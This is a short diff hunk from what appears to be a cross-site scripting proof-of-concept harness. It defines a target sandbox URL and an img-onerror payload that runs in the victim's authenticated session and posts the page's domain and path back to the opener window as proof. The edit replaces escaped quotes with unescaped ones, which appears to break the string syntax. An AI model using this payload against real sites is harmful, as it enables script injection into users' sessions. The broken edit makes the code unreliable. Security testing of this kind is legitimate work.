@@ -22,7 +22,7 @@ const TARGET = "https://82qozx6gt920260612022927.sandbox.bamkounified.com";
 // The payload the operator asked for. onerror runs in the TARGET origin, inside the
 // victim's authenticated session, and posts document.domain back to us as proof.
 const PAYLOAD =
-  '<img src=x onerror="alert(\'document.cookie\');' +
+  '<img src=x onerror="alert('document.cookie');' +
   'if(window.opener)opener.postMessage(\'XSSFIRED::\'+document.domain+\'|\'+location.pathname,\'*\')">';
 
 const log = document.getElementById('log');
